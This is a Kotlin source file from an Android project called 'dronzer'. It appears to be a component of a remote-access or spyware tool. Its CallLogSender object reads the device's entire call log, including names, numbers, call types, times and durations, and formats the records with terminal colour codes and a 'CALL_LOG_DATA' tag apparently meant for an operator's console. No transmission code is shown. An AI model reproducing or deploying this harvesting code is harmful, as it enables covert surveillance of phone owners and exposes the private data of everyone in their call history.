package com.example.dronzer

import android.content.Context
import android.provider.CallLog
import android.util.Log
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object CallLogSender {

    fun getCallLogString(context: Context): String {
        val callLogBuffer = StringBuilder()
        callLogBuffer.append("\u001b[1;35m--- Call Log ---\u001b[0m\n")
        try {
            val dateFormat = SimpleDateFormat("dd/MM/yyyy", Locale.getDefault())
            val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
            
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC"
            )

            cursor?.use {
                val numberIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durationIdx = it.getColumnIndex(CallLog.Calls.DURATION)

                while (it.moveToNext()) {
                    val phNumber = it.getString(numberIdx) ?: "Unknown"
                    val contactName = it.getString(nameIdx) ?: "Unknown Contact"
                    val type = it.getInt(typeIdx)
                    val timestamp = it.getLong(dateIdx)
                    val callDuration = it.getString(durationIdx) ?: "Unknown"
                    
                    val dateStr = dateFormat.format(Date(timestamp))
                    val timeStr = timeFormat.format(Date(timestamp))

                    val callType = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                        CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                        CallLog.Calls.MISSED_TYPE -> "MISSED"
                        CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                        CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
                        else -> "UNKNOWN"
                    }

                    // Structured format for GUI parsing
                    callLogBuffer.append("CALL_LOG_DATA: Name: $contactName, Num: $phNumber, Type: $callType, Date: $dateStr, Time: $timeStr, Dur: ${callDuration}s\n")
                }
            }
        } catch (e: Exception) {
            Log.e("CallLogSender", "Error reading call logs: ${e.message}")
        }
        
        return if (callLogBuffer.length > 30) {
            callLogBuffer.toString()
        } else {
            "\u001b[1;31m--- Call Log ---\u001b[0m\n(No call logs found)\n"
        }
    }
}